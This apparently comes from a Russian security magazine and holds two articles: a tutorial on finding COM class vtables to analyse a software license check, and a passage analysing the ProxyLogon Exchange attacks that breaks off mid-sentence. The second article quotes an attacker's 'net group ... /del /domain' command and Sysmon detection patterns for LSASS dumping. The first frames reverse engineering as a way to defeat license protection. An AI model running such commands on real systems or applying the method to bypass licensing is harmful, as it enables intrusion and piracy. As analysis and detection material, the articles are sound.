                                                                    МВК

             РЕВЕРСИМ КОД С ACTIVEX
                 И OLE AUTOMATION





Чего только не придума ют хитрые кодеры, дабы осложнить
работу бедным хакерам, лома ющим их софт! Все уже при‐
выкли к тому, что исполняемый модуль программы исполь‐
зует клас сы, функции и методы, содержащиеся в нем самом
либо во внешних динамических библиотеках (DLL), стан дар‐
тных или не очень. Однако нередко программа для получе‐
ния данных или выполнения каких‐то действий обращается
к системным службам или серверам ActiveX, и это очень неп‐
риятно. Пер вый случай гораздо более суровый, поэтому
отложим его обсуждение на потом, а сегодня начнем
с вещей попроще.


Ты наверняка слышал о майкро софтовской технологии OLE Automation,
которая  позволяет  свя зывать  друг  с  дру гом приложения,  написанные
на совершенно разных языках, в том числе скрипты. Про нее сказано очень
много (на страницах твоего любимого журнала тоже), поэтому не буду
углубляться в тонкости ее реализации. Оста новлюсь лишь на нескольких
моментах, которые помогут в раз борке и реконс трукции кода, использующего
OLE Automation.
   Суть в том, что в операционной системе регистрируется некий набор
управляющих элементов  ActiveX, содержащих методы и классы, доступ
к которым из любого приложения можно получить при помощи этой тех‐
нологии. Такой элемент с иерархичес ким описанием содержащихся в нем
классов и методов называ ется биб лиотекой типов (TypeLibrary). К примеру,
другая известная майкрософтовская технология .NET поддерживает тесное
взаимодействие с такими библиотеками. Нас только тесное, что может
отдельные классы и методы в сво их сборках выносить в эти библиотеки, а при
загрузке сборки OLE Automation стыкует их как родные. В таких сборках нап‐
рочь отсутствует IL‐код, а тела методов в самой биб лиотеке пустые. В сегод‐
няшней статье я расскажу, как бороться с подобными явле ниями и реконс‐
труировать такой запутанный код.
  В одной из сво их предыдущих ста тей я расска зывал о подмене IL‐кода
при JIT‐компиляции на лету. Однако бывают случаи, когда IL‐код в сборке
отсутствует. К примеру, разбираешь ты себе спокойно некий дотнетовский
проект в каком‐нибудь dnSpy, все замечатель но, ни тебе обфускации,
ни защиты от отладки. Трассируешь проверку лицензии, и р‐раз! — провали‐
ваешься в функцию, в которой нет кода. Смотришь на библиотеку, а она вся
такая: кода нет, одни заголовки.
   Натравляем на нее деобфускаторы, в надежде, что код как‐то хитро спря‐
тан. Но нет, код действительно отсутству ет, а при вдумчивом анализе биб‐
лиотеки в IDA или CFF видно, что все тела методов пус тые. И только сейчас
мы обращаем внимание, что методы помечены атрибутом MethodImpl(
MethodImplOptions.InternalCall). В CFFExplorer в окне Method ImplFlags
тоже стоит галка напротив InternalCall. Так что же это за неведома зве руш‐
ка?
  Немного покурив теорию, мы вспомина ем: этот атрибут указывает сре де
выпол нения, что она имеет дело с вызовом нативного метода (не IL, а хар‐
дкорных платформен но зависимых машин ных кодов) из связанной с исполня‐
емым файлом библиотеки, которая может быть написана на C, C++ или даже
на ASM. Подобным образом также реализуются внутренние вызовы исполня‐
емого кода, например из mscorlib. Эту задачу мож но реализовать, в частнос‐
ти, через атрибут DllImport. В этом слу чае хотя бы ясно, в какой именно
функции какой именно библиотеки следует искать нужный код реализации,
но в нашем примере соз датели проекта решили максимально испортить нам
жизнь. Еще нем ного поковыряв куцый огрызок кода библиотеки, мы обна‐
руживаем в ее заголовке следующую конс трукцию:


[CoClass(typeof(CheckerClass)), Guid(
"3F5942E1‐108B‐11d4‐B050‐000001260696")]
[ComImport]

Снова сверившись с документацией, мы приходим к выводу, что наша биб‐
лиотека служит всего лишь переходным интерфей сом к COM‐библиотеке
типов с данным GUID. И все содержащиеся в ней функции автоматически
перетранслируются в методы соответству ющего класса. Благо в описании
каждой функции есть ее индекс DispID. Поп робуем найти эту биб лиоте ку
типов среди зарегистрированных в системе.
  Для начала просто запус каем regedit и ищем наш GUID. Действительно,
в ветке HKLMACHINE\SOFTWARE\Classes\Interface\ обнаруживается раздел
{3F5942E1‐108B‐11d4‐B050‐000001260696}, а в нем — целых три подразде‐
ла. В одном из  них, озаглавленном TypeLib, мы видим другой GUID
{62C8FE65‐4EBB‐45E7‐B440‐6E39B2CDBF29}. Теперь вобьем в поиск уже
его, и наше терпение вознаграждается: мы находим это значение в парамет‐
ре  TypeLib  раздела  HKEY_CLASSES_ROOT\CLSID\{67283557‐1256‐3349‐
A135‐055B16327CED}. Этот GUID нам до боли знаком, мы видели его
в заголовке нашей многос тра дальной биб лиотеки:


[ClassInterface(0), ComSourceInterfaces("LICCHECKLib._ICheckerEvents\
0\0"), Guid("67283557‐1256‐3349‐A135‐055B16327CED"), TypeLibType(2)]

Этот раздел содержит много интерес ного, но главное — в подразделе In‐
procServer32 мы находим пол ный путь к TypeLibrary, который можно пре‐
парировать! Вообще говоря, тот же результат мож но (и нужно) было получить
гораздо проще. У Microsoft есть маленькая, но очень полезная утилита
OLE/COM Object viewer (oleview.exe). Она входит в пакет утилит, поставля‐
ющихся вместе с MSVC. Мы с самого начала знали имя клас са, поэтому дос‐
таточно запустить ее и найти этот класс в упо рядоченном по алфавиту раз‐
деле Controls.
  Еще можно было поис кать по имени клас са и в Regedit, но у Oleview есть
существенное преимущес тво: в контекс тном меню при выборе пункта View
Type  Information программа выда ет всю внутреннюю структуру нужной
библиотеки типов, включая экспортиру емые клас сы и методы. Того же
эффекта можно было бы добить ся, загрузив в него наш OCX через File → View
TypeLib. По сути дела, он декомпилиру ет встроенный в библиотеку TLB,
который можно самому вытащить отту да редактором ресурсов (требуемый
ресурс так и называется: TYPELIB).
   Казалось бы, все у нас хорошо, да не очень. Мы, по сути, вернулись
на исходную позицию: у нас есть список заголовков методов с параметрами,
но как получить их код — неясно. Нес мотря на то что TypeLibrary представляет
собой стандартную библиотеку Windows, в отличие от экспортиру емых фун‐
кций DLL нельзя прос то так взять и пос мотреть спи сок экспортируемых
методов с их точками вхо да. Все потому, что COM‐объ екты внутренние и не
раскрывают детали своей реализации путем экспорта функций. Вместо этого
COM предоставляет интерфейс для соз дания экземпля ров COM‐класса
через вызов CoCreateInstance с использованием UUID (обычно известного
CLSID) в качестве средства идентифика ции клас са COM.
  Возвращаемый объект — это объект C++, реализующий набор API‐
интерфейсов, которые представлены в виде таблицы виртуальных функций
для этого COM‐объекта. Поэто му нет необ ходимости экспортировать эти
функции, и ты не можешь найти их с помощью представления экспорта IDA.
Поскольку реализация данной выдачи может варь ироваться разработчиком
каждой  конкретной  TypeLibrary,  не сущес твует  универсальных методов
реверс‐инжиниринга для подобных биб лиотек. Хотя справедливости ради
надо сказать, что начиная с конца шес тых версий IDA сильно эволюциони‐
ровала в данном вопросе.
   Что ж, для начала попробуем смоделировать вызов метода из своей прог‐
раммы. Не буду вдавать ся в непростые подробности программирования
COM‐клиента, они очень подробно и доходчиво рас писаны на сайте «Первые
шаги». Отсюда же берем и готовый код клиента:


#include "windows.h"
#include "iostream.h"
#include  "initguid.h"


DEFINE_GUID(IID_Step,
0x3f5942e2, 0x108b, 0x11d4, 0xb0, 0x50, 0x0, 0x0, 0x1, 0x26, 0x6,
0x96);


class IStep : public IUnknown {
  public:
    IStep();
    virtual ~IStep();
    STDMETHOD(MyComMessage) () PURE;
};


void main() {
  cout << "Initializing COM" << endl;
  if( FAILED( CoInitialize( NULL ) ) ) {
    cout << "Unable to initialize COM" << endl;
    return ;
  }


  CLSID clsid;
  HRESULT hr = ::CLSIDFromProgID( L"LicCheck.Checker.1", &clsid );


  if( FAILED( hr ) ) {
    cout << "Unable to get CLSID " << endl;
    return ;
  }


  IClassFactory* pCF;
  hr = CoGetClassObject( clsid,
                         CLSCTX_INPROC,
                         NULL,
                         IID_IClassFactory,
                         (void**) &pCF );
  if ( FAILED( hr ) ) {
    cout << "Failed to GetClassObject " << endl;
    return ;
  }


  IUnknown* pUnk;
  hr = pCF‐>CreateInstance( NULL, IID_IUnknown, (void**) &pUnk );
  pCF‐>Release();
  if( FAILED( hr ) ) {
    cout << "Failed to create server instance " << endl;
    return ;
  }
  cout << "Instance created" << endl;


  IStep* pStep = NULL;
  hr = pUnk‐>QueryInterface( IID_Step, (void**) &pStep );
  pUnk‐>Release();
  if( FAILED( hr ) ) {
      cout << "QueryInterface() for IStep failed" << endl;
      CoUninitialize();
      return ;
  }


  pStep‐>MyComMessage();
  pStep‐>Release();
  cout << "Shuting down COM" << endl;
  CoUninitialize();
}

В макросе DEFINE_GUID мы поставили свой GUID, чтобы обращение велось
именно к нашему классу. Не будем замора чиваться и менять объявление
класса IStep, в нем уже есть один метод. Нас, по сути, интересует реали‐
зация самой таблицы адресов. Мы даже не будем возиться с параметрами,
хотя если мы начнем вдумчиво и полноценно копать конкретный метод
в отладчике, то нам таки придет ся это делать. Одна ко в первом приближении
для простоты примера опус тим эти мелочи.
   Итак, скомпилировав этот любезно предоставленный автором пример,
загрузив его в отладчик и исполняя данный код пошагово, мы замечаем, что
после  вызова  CoGetClassObject наша биб лиотека  типов  загружается
в память процесса и на нее уже мож но ста вить бряки. А pUnk‐>QueryInter‐
face возвращает собственный ука затель на указатель на таблицу виртуаль‐
ных методов 1012E1DC. И тут нас снова ждет облом: это явно не та таблица,
которую мы ищем.
  При дальнейшем изучении видно, что в найденной таблице всего пять
методов, а у нас свыше полусот ни, да и код этих методов по передаваемым
параметрам явно не соответству ет заголовкам. Немножко подумав, мы
понимаем, в чем дело: предложенный пример реализовывался через фаб‐
рику классов. Собственно, CoGetClassObject и возвращает интерфейс этой
самой фабрики, содержащейся в биб лиотеке типов. Однако нам нужна
не она, нам нужен наш родной класс Checker, точнее, его таблица виртуаль‐
ных методов.
  Ясно, что в данной биб лиотеке таких таблиц как собак нерезаных и, чтобы
получить доступ именно к нужной, надо долго и упорно изу чать чудовищно
запутанные и нелогич ные майкрософтовские ману алы по COM, которые (что
обиднее всего) нам, скорее всего, и не понадобятся вне решения данной
задачи. Поэтому откла дываем пока упомянутый способ как запасной (как
только у нас появится адрес нужной таблицы, его, нес мотря ни на что, впол не
можно использовать для грязной отладки методов) и возвращаемся к IDA.
   Как я уже говорил, на первый взгляд все выглядит так же уныло. Из биб‐
лиотеки торчат уши четырех экспортируемых функций: DllCanUnloadNow,
DllGetClassObject,   DllRegisterServer   и   DllUnregisterServer,
при помощи которых отыскать нужную таблицу весь ма проблематично. Наз‐
вания методов в коде (помимо встро енного ресурса TYPELIB) тоже отсутс‐
твуют, и вообще данный раздел весьма слабо задокументирован. По счастью,
нашлись умные люди, которые рас ковыря ли принцип размещения таблиц
виртуальных адресов в библиотеке типов, скомпилированных компилятором
C++.
  Разумеется, эти данные получены чисто эмпирически и зависят от реали‐
зации компилятора, поэто му все гарантии, что так будет везде и всегда, весь‐
ма смутны и основаны на совместимос ти с соглашениями о вызовах COM,
которые требуют последова тельного наз начения слотов для виртуальных
функций. Базовая структура, которая описыва ет каждый класс, — так называ‐
емый RTTI Complete Object Locator — выглядит вот так:


typedef const struct _s__RTTICompleteObjectLocator {
  unsigned long signature;
  unsigned long offset;
  unsigned long cdOffset;
  _TypeDescriptor *pTypeDescriptor;
  __RTTIClassHierarchyDescriptor *pClassDescriptor;
} __RTTICompleteObjectLocator;

Нам нужны в ней два поля (остальные пус тые) — pTypeDescriptor, которое
указывает на имя класса, и второе, ука зывающее на описатель иерархии
базовых  классов  pClassDescriptor.  Пос ледний  содержит  количество
базовых классов и указатель на их мас сив:


typedef const struct _s__RTTIClassHierarchyDescriptor {
  unsigned long signature;
  unsigned long attributes;
  unsigned long numBaseClasses;
  __RTTIBaseClassArray *pBaseClassArray;
} __RTTIClassHierarchyDescriptor;

Данный массив содержит ука затели, указыва ющие, в свою оче редь, на Type‐
Descriptor каждого базово го класса, причем обычно первый из них — наш
класс. Для наглядности приведу схему раз мещения данных структур и их свя‐
зи друг c другом на примере конкретного класса ATL::CComClassFactory.
Таблицу виртуальных методов которого, кстати сказать, возвращает код
из описанного выше примера.





                    Таб лица виртуальных методов

Как видно из рисунка, у него шесть базовых классов, vftable сос тоит из пяти
методов. Исходя из сказанного выше, применя ем эмпирический принцип
поиска vftable для каждого клас са. Поскольку компилятор обычно дает ком‐
пилированным классам имена, начина ющиеся с .?AV, то тупо ищем в коде
TypeDescriptor по данной сигнатуре. По ссылке на него ищем RTTI Complete
Object Locator, по ссылке на который, в свою очередь, vftable. Код питонов‐
ского скрипта для IDA, реализующего данный поиск, приведен ниже (код взят
из статьи в блоге Quarkslab):


# IDA Python RTTI parser ~pod2g 06/2013
from idaapi import *
from idc import *


# TODO: test on 64bit !!!
addr_size = 4


first_seg = FirstSeg()
last_seg = FirstSeg()
for seg in Segments():
    if seg > last_seg:
        last_seg = seg
    if seg < first_seg:
        first_seg = seg


def get_pointer(ea):
    if addr_size == 4:
        return Dword(ea)
    else:
        return Qword(ea)


def in_image(ea):
    return ea >= first_seg and ea <= SegEnd(last_seg)


def get_class_name(name_addr):
    s = Demangle('??_7' + GetString(name_addr + 4) + '6B@', 8)
    if s != None:
        return s[0:len(s)‐11]
    else:
        return GetString(name_addr)


start = first_seg
while True:
    # Ищем в коде сигнатуру ".?AV" — обычно так начинаются классы C++
    f = FindBinary(start, SEARCH_DOWN, "2E 3F 41 56")
    start = f + addr_size
    if f == BADADDR:
        break
    rtd = f ‐ 8
    # Преобразуем в нормальное имя и печатаем
    print "Found class: %s (rtd=0x%X)" % (get_class_name(f), rtd)
    # Ищем все ссылки на смещение начала класса — 8
    for xref in XrefsTo(rtd):
        # Следующее слово — смещение rchd
        rchd = get_pointer(xref.frm + addr_size)
        # На всякий случай, вдруг случайное левое смещение
        if in_image(rchd):
            # rcol — RTTI Complete Object Locator
            rcol = xref.frm ‐ 12
            # rchd + 8 — количество базовых классов
            rchd_numBaseClasses = Dword(rchd + 8)
            # rchd + 12 — их массив, который по очереди перебираем
            rchd_pBaseClassArray = get_pointer(rchd + 12)
            for i in range(rchd_numBaseClasses):
                rbcd = get_pointer(rchd_pBaseClassArray + addr_size *
i)
                # Каждый элемент массива — указатель на базовый класс
                rbcd_pTypeDescriptor = get_pointer(rbcd)
                rbcd_pTypeDescriptor_name = get_class_name(
rbcd_pTypeDescriptor + 8)
                print "  ‐ base class: %s" %
rbcd_pTypeDescriptor_name
            # Ссылка на RTTI Complete Object Locator — vtable
            for xref in XrefsTo(rcol):
                vtable = xref.frm + addr_size
                break
            print "  ‐ vtable: 0x%X" % vtable

Как видишь, принцип достаточно прост: обращаю внимание, что существу‐
ющий код заточен под 32‐битную архитек туру, под 64‐битную его придется
допиливать, как минимум поменяв раз мер слова addr_size  =  8, хотя,
на первый взгляд, данный прин цип постро ения кода характерен и для нее.
   Натравив дан ный скрипт на нашу биб лиотеку типов, получаем в логе IDA
длиннющую простыню, ибо классов в биб лиотеке содержится великое мно‐
жество. Однако в самом начале ее мы видим следующее:


Found class: ATL::CComObjectCached<ATL::CComClassFactory> (rtd=
0x10155070)
  ‐ base class: ATL::CComObjectCached<ATL::CComClassFactory>
  ‐ base class: ATL::CComClassFactory
  ‐ base class: IClassFactory
  ‐ base class: IUnknown
  ‐ base class: ATL::CComObjectRootEx<ATL::CComMultiThreadModel>
  ‐ base class: ATL::CComObjectRootBase
  ‐ vtable: 0x1012E1DC
Found class: ATL::CComClassFactory (rtd=0x101550BC)
  ‐ base class: ATL::CComClassFactory
  ‐ base class: IClassFactory
  ‐ base class: IUnknown
  ‐ base class: ATL::CComObjectRootEx<ATL::CComMultiThreadModel>
  ‐ base class: ATL::CComObjectRootBase
  ‐ vtable: 0x1012E1F8
Found class: ATL::CComObjectRootEx<ATL::CComMultiThreadModel> (rtd=
0x10155128)
Found class: ATL::CComObjectRootBase (rtd=0x10155178)
Found class: ATL::CComObject<CChecker> (rtd=0x101551A4)
  ‐ base class: ATL::CComObject<CChecker>
  ‐ base class: CChecker
  ‐ base class: ATL::CComObjectRootEx<ATL::CComSingleThreadModel>
  ‐ base class: ATL::CComObjectRootBase
  ‐ base class: ATL::IDispatchImpl<IChecker,&_GUID const IID_IChecker
,&_GUID const LIBID_LICCHECKLib,1,0,ATL::CComTypeInfoHolder>
  ‐ base class: IChecker
  ‐ base class: IDispatch
  ‐ base class: IUnknown
  ‐ base class: ATL::CComControl<CChecker,ATL::CWindowImpl<CChecker,
ATL::CWindow,ATL::CWinTraits<1442840576,0>>>
  ‐ base class: ATL::CComControlBase
  ‐ base class: ATL::CWindowImpl<CChecker,ATL::CWindow,ATL::
CWinTraits<1442840576,0>>
  ‐ base class: ATL::CWindowImplBaseT<ATL::CWindow,ATL::CWinTraits<
1442840576,0>>
  ‐ base class: ATL::CWindowImplRoot<ATL::CWindow>
  ‐ base class: ATL::CWindow
  ‐ base class: ATL::CMessageMap
  ‐ base class: ATL::IPersistStreamInitImpl<CChecker>
  ‐ base class: IPersistStreamInit
  ‐ base class: IPersist
  ‐ base class: IUnknown
  ‐ base class: ATL::IOleControlImpl<CChecker>
  ‐ base class: IOleControl
  ‐ base class: IUnknown
  ‐ base class: ATL::IOleObjectImpl<CChecker>
  ‐ base class: IOleObject
  ‐ base class: IUnknown
  ‐ base class: ATL::IOleInPlaceActiveObjectImpl<CChecker>
  ‐ base class: IOleInPlaceActiveObject
  ‐ base class: IOleWindow
  ‐ base class: IUnknown
  ‐ base class: ATL::IViewObjectExImpl<CChecker>
  ‐ base class: IViewObjectEx
  ‐ base class: IViewObject2
  ‐ base class: IViewObject
  ‐ base class: IUnknown
  ‐ base class: ATL::IOleInPlaceObjectWindowlessImpl<CChecker>
  ‐ base class: IOleInPlaceObjectWindowless
  ‐ base class: IOleInPlaceObject
  ‐ base class: IOleWindow
  ‐ base class: IUnknown
  ‐ base class: ISupportErrorInfo
  ‐ base class: IUnknown
  ‐ base class: ATL::IConnectionPointContainerImpl<CChecker>
  ‐ base class: IConnectionPointContainer
  ‐ base class: IUnknown
  ‐ base class: ATL::IPersistStorageImpl<CChecker>
  ‐ base class: IPersistStorage
  ‐ base class: IPersist
  ‐ base class: IUnknown
  ‐ base class: ATL::ISpecifyPropertyPagesImpl<CChecker>
  ‐ base class: ISpecifyPropertyPages
  ‐ base class: IUnknown
  ‐ base class: ATL::IQuickActivateImpl<CChecker>
  ‐ base class: IQuickActivate
  ‐ base class: IUnknown
  ‐ base class: ATL::IDataObjectImpl<CChecker>
  ‐ base class: IDataObject
  ‐ base class: IUnknown
  ‐ base class: ATL::IProvideClassInfo2Impl<&_GUID const
CLSID_Checker,&_GUID const DIID__ICheckerEvents,&_GUID const
LIBID_LICCHECKLib,1,0,ATL::CComTypeInfoHolder>
  ‐ base class: IProvideClassInfo2
  ‐ base class: IProvideClassInfo
  ‐ base class: IUnknown
  ‐ base class: ATL::IPropertyNotifySinkCP<CChecker,ATL::
CComDynamicUnkArray>
  ‐ base class: ATL::IConnectionPointImpl<CChecker,&_GUID const
IID_IPropertyNotifySink,ATL::CComDynamicUnkArray>
  ‐ base class: ATL::_ICPLocator<&_GUID const IID_IPropertyNotifySink
>
  ‐ base class: ATL::CComCoClass<CChecker,&_GUID const CLSID_Checker>
  ‐ vtable: 0x1012E6A4

То есть адрес таблицы нашего класса Checker — 1012E6A4 очень похож
на настоящий. Количество ссылок, во всяком случае, совпадает. Для примера
берем код метода по произвольной ссылке: количес тво передаваемых
параметров вроде как в норме. Что ж, можно нас поздравить, похоже, мы
нашли таблицу виртуальных методов. Опи раясь на которую, можно с опре‐
деленной долей уверенности ставить точки останова в отладчи ке или реконс‐
труировать код. Вооб ще говоря, при определенной доле сноровки можно
было бы обойтись и без скрипта.





                    Плагин СlassInformer для IDA

К примеру, еще с конца 6‐х версий IDA был соз дан плагин СlassInformer,
помогающий в поиске и раз борке RTTI (хотя, спра ведливос ти ради, у меня так
толком и не получилось запустить его в полном объеме ни на одной версии
IDA из име ющихся под рукой). Тем более седьмые версии и сами уме ют
искать и отображать RTTI Complete Object Locator, чего, в принципе, вполне
достаточно для поиска vftable.
  Ложка дегтя в том, что на один и тот же RTTI Complete Object Locator могут
ссылаться несколь ко vftable, то есть полностью «однокнопочного» решения
данный метод не дает и всег да есть мес то для хакерской интуиции.
ВЗЛОМ
PROXYLOGON





      КАК РАБОТАЕТ УЯЗВИМОСТЬ В
     MICROSOFT EXCHANGE SERVER
    И КАК ЕЕ ИСПОЛЬЗУЮТ ХАКЕРЫ





Неуязвимых программ не бывает — эта
истина извес тна каждому. Но когда зло‐
умышленники отыскивают в каком‐нибудь
софте уязвимости нулевого дня, начина‐
ется веселье: и для пользователей, и для       Валентин Холмогоров                                                                                               valentin@holmogorov.ru
разработчиков,   которым   приходится
в  авральном режиме заделывать  обна‐
руженные бреши. А если это происхо дит
с очень популярным и широко распростра‐
ненным ПО, веселье начина ет приобретать
оттенки драмы. Именно это и случилось
с  Microsoft  Exchange  Server  в  янва‐
ре 2021 года.


Одной из первых о проблемах в Exchange со общила компания FireEye.
По информации вендора, от деятельнос ти хакеров пос традало множество
американских коммерчес ких фирм, нес колько мес тных органов власти в раз‐
ных штатах, а также один из универ ситетов и даже неназванный исследова‐
тельский центр. Киберпрес тупники заливали на взломанные серверы Ex‐
change веб‐шеллы с целью неавторизованного доступа, удаленно выполняли
код и отключали работающие в системе средства безопас ности.
   Вскоре в Microsoft подтвердили наличие проб лемы и сообщили, что зло‐
деи используют в своих зло дейских целях как минимум четыре ранее неиз‐
вестные уязвимости нулевого дня. Для устранения которых всем пользовате‐
лям Exchange Server нужно срочно установить выпущенные ими патчи. Одна‐
ко всем известно, что накатывание обновлений — дело небыстрое, тре‐
бующее значительных за пасов пива временных зат рат, и потому хакеры про‐
должали резвиться на взломанных серверах в течение еще нескольких
месяцев. Атаки на Exchange понемногу пошли на спад только к концу нынеш‐
него марта. В чем же заключались эти уязвимости и как их использовали
в своих целях зло умышленники? Давай раз беремся.


ЧТО ПРОИЗОШЛО?
По сообщениям аналитиков из FireEye, хакеры использовали несколько век‐
торов атаки. Все файлы на серверах Exchange создавались ими от имени
системной учетной записи NT  AUTHORITY\SYSTEM, имеющей в Windows
повышенные привилегии, а веб‐шеллы запускались процессом единой служ‐
бы обмена сообщениями Microsoft Exchange UMWorkerProcess.exe. Родите‐
лем обнаруженных исследователями на скомпрометированных серверах вре‐
доносных   файлов    ока зался   про цесс   w3wp.exe,    отвечающий
за веб‐интерфейс Exchange  Server. Исследова тели из Microsoft пришли
к выводу, что за всеми этими инцидентами сто ит некая хакерская группа
под названием HAFNIUM, которая рань ше уже была замечена в атаках
на американские оборонные предприятия, юри дические фирмы, аналитичес‐
кие центры и лаборатории по исследованию инфекционных заболе ваний.
Предполагают, что эта группа свя зана с правительством Китая, но стоп‐
роцентных доказательств это му, разумеется, нет.
  История началась в январе 2021 года, когда раз работанная FireEye служ‐
ба Mandiant Managed Defense обнаружила на одном из серверов Microsoft Ex‐
change подозрительный веб‐шелл. Скрипт с незатейливым именем help.
aspx пытался отыскать на сервере инс трументы обеспечения безопасности
FireEye xAgent, CarbonBlack и CrowdStrike Falcon и сохранял в журнал резуль‐
тат своей работы.





           Фрагмент скрипта help.aspx, иллюстрация FireEye

Шелл был запущен процессом UMWorkerProcess.exe, который  свя зан
со службой единой системы обмена сообщениями Microsoft Exchange Server.
Для этих целей зло умыш ленники вос пользовались уязвимостью CVE‐2021‐
26858, которую в Microsoft отнесли к категории средней сте пени риска.
   Спустя примерно двадцать дней хакеры совершили новое злодеяние,
залив на сервер другой веб‐шелл с именем iisstart.aspx. Этот скрипт был
обфусцирован и обладал более широким набором функций: он поз волял
выпол нять произволь ные команды, а также прос матривать содержимое, уда‐
лять, загружать на сервер и запус кать файлы по желанию атакующих. Добить‐
ся желаемого хакерам удалось с использованием уяз вимостей Microsoft Ex‐
change Server.





          Фрагмент скрипта iisstart.aspx, иллюстра ция FireEye

Вскоре аналитики FireEye обратили внимание еще на один инцидент с запус‐
ком на сервере Exchange вредонос ного веб‐шелла. На сей раз свя занный
с веб‐интерфейсом Internet Information Server процесс w3wp.exe запустил
командную строку (cmd.exe), а с помощью ее злоумышленники, в свою оче‐
редь, сохранили на диск некий файл. Этим фай лом оказал ся небезызвестный
инструмент China Chopper Web Shell, которым давно и успешно пользуются
китайские хакеры. Небольшой файлик весом всего лишь 4 Кбайт открывает
взломщикам доступ к файловой системе и базам данных скомпрометирован‐
ного сервера. По большому счету он представляет собой компактный бэкдор,
которым можно удаленно управлять с помощью прос той утилиты с интуитивно
понятным графическим интерфейсом.





  Утилита управления China Chopper имеет удоб ный графический
  интерфейс

Кроме того, исследователи установили, что в обо их этих слу чаях атакующие
удаляли пользователя administrator из груп пы Exchange  Organization
administrators контроллера домена, к которо му принадлежал атакованный
сервер. Делалось это при помощи команды net group "Exchange Organi‐
zation administrators" administrator /del /domain. Если Exchange
Server был развернут в одноранговой сети без подключения к AD, команда
выпол нялась локально.
  Выяснилось, что после успешного взлома хакеры использовали сле‐
дующие виды постэксплу атации:
 • кража учетных данных пользователей с помощью дампа памяти процесса
   LSASS;
 • использование оснасток Exchange PowerShell для экспорта пользователь‐
   ских почтовых ящиков;
 • использование инстру ментов Covenant, Nishang и PowerCat для удален‐
   ного доступа к взломанному серверу.

Всю добытую информацию зло деи упа ковы вали с помощью архиватора 7zip
и благополучно скачивали со взло манных узлов. Ины ми словами, на началь‐
ном этапе основной целью атакующих был сбор информации на скомпро‐
метированных серверах и хищение конфиденциальной пользовательской
информации.


РАССЛЕДОВАНИЕ
Тщательное изучение этих атак началось сразу с нес кольких сторон: с одной
стороны раскопки возглавила компания FireEye, инс трументы безопас ности
которой первыми и зафиксирова ли угрозу, с дру гой за лопаты взя лись
эксперты из корпорации Microsoft, авторству которой принадлежит уяз вимый
Exchange Server. Чуть позже к процессу подключилась ESET.
  Иссле дователи установили, что, помимо HAFNIUM, к взломам с исполь‐
зованием уязвимостей Exchange Server могут быть причастны и другие хакер‐
ские группы китайского происхождения — LuckyMouse, Tick и Calypso. Кибер‐
злодеи выполняли серию атак с использовани ем цепочки уязвимостей CVE‐
2021‐26855, CVE‐2021‐26857, CVE‐2021‐26858 и CVE‐2021‐27065, конечной
целью которых станови лось уда ленное выпол нение кода без проверки под‐
линности. Эта цепочка получила общее наименование ProxyLogon. На одном
из взломанных серверов ана литики обнаружили целых два разных веб‐шелла,
из чего сделали вывод, что сервер ломали с помощью одних и тех же уяз‐
вимостей две независимые группы хакеров, использующие для пос тэкс плу‐
атации разный инструментарий.
  Одним из характерных признаков компро метации было появление в сис‐
теме подозрительных процессов, родителем которых выступает процесс еди‐
ной службы обмена сообщениями Exchange UMWorkerProcess.exe. Кроме
того, следы вторжения могут быть обнаружены в журналах событий при ложе‐
ний Windows, поскольку использование ошиб ки десериализации в уязвимос‐
ти CVE‐2021‐26857 приводит к регистра ции ошибок службы еди ной системы
обмена сообщениями MSExchange. В этих же журналах можно поискать
события, связанные с запуском cmd.exe или консоли PowerShell процессом
фронтенда IIS C:\Windows \System32\inetsrv\w3wp.exe. В свою очередь,
уязвимость CVE‐2021‐26858 использовалась злоумышленниками для уда‐
ления файлов на сервере, в основном — ставших ненужными скриптов
веб‐шеллов после успешной уста новки полезной нагрузки в виде бэкдоров.
   Если сервер уже был взло ман, следы при сутствия на нем злоумышленни‐
ков можно было обнаружить с помощью Sysmon, если поискать подозритель‐
ные файлы в непривычных мес тах. Для кра жи пользовательских учетных дан‐
ных злодеи создавали дамп памяти LSASS с помощью утилиты командной
строки ProcDump, вызов которой также мож но отследить в логах или с
помощью Sysmon:


norm_id=WindowsSysmon label="Process" label=Create
command IN ["* ‐ma lsass*"]

Для экспорта данных почтовых ящиков пользователей Exchange Server ата‐
кующие использовали оснас тку Exchange PowerShell, запуск которой легко
определить, отсле живая события создания процесса в Sysmon или проана‐
лизировав журнал событий:


norm_id=WindowsSysmon label="Process" label=Create
image IN ["*\cmd.exe", "*\powershell.exe", "*\powershell_ise.exe"]
command="*Add‐PSSnapin Microsoft.Exchange.Powershell.Snapin*"

Если на сервере не отклю чен Windows Defender, появляется возможность
определить вре доносную активность при обнаружении используемых ата‐
кующими скриптов и полез ной нагрузки, которые Defender детектирует сле‐
дующим образом:
 • Exploit:Script/Exmann.A!dha;
 • Behavior:Win32/Exmann.A;
 • Backdoor:ASP/SecChecker.A;
 • Backdoor:JS/Webshell;
 • Trojan:JS/Chopper!dha;
 • Behavior:Win32/DumpLsass.A!attk;
 • Backdoor:HTML/TwoFaceVar.B.

В целом вырисо вывалась следующая картина. Злодеи отправляли на сервер
специальным образом сформированный HTTP‐запрос и благодаря  уяз‐
вимости CVE‐2021‐26855 авторизовались на сервере. Затем с помощью
остальных трех уязвимостей атакующие заливали на сервер веб‐шелл в виде
файла .aspx, который запускался процес сами w3wp.exe или UMWorkerPro‐
cess.exe. Эти скрипты, имевшие в раз ных случаях взлома разные имена, сох‐
ранялись в папку %temp% и запускались от имени привилегированной сис‐
темной учетной записи NT AUTHORITY\SYSTEM. Получив веб‐шелл, атакующие
получали доступ к командной строке или консоли PowerShell в контексте про‐
цесса w3wp.exe, а затем сохраняли на диск и запускали полезную нагрузку,
в качестве которой выступали раз личные бэкдоры, а также широко известные
Cobalt Strike и BEACON. В качес тве пос леднего шага злоумышленники уда‐
ляли за собой файлы скриптов.





             Общая схема ата ки на Exchange Server


ПОСЛЕДСТВИЯ
В Microsoft незамедлительно выпустили заплатки для всех обнаруженных уяз‐
вимостей, которые хакеры использовали для атак на серверы Microsoft Ex‐
change. Однако, поскольку уста новка обновлений — дело не мгновенное,
а информация о дырах в безопас ности Exchange Server быстро раз летелась
по всему интернету, поиск и взлом непропатченных серверов вскоре прев‐
ратился в подобие весело го спортивно го сос тязания. Хакеры не только крали
пользовательские данные, на скомпромети рованные серверы устанавливали
троян‐майнер DLTminer и дру гие вредонос ные программы.
  Среди пострадавших оказались такие орга низа ции, как Европей ское бан‐
ковское управле ние, Министерство труда и социальных дел в Чехии и поч‐
товые отде ления в Праге. Мас ла в огонь подлило и то обстоятельство, что
в начале марта независимый исследова тель из Вьетнама опубликовал
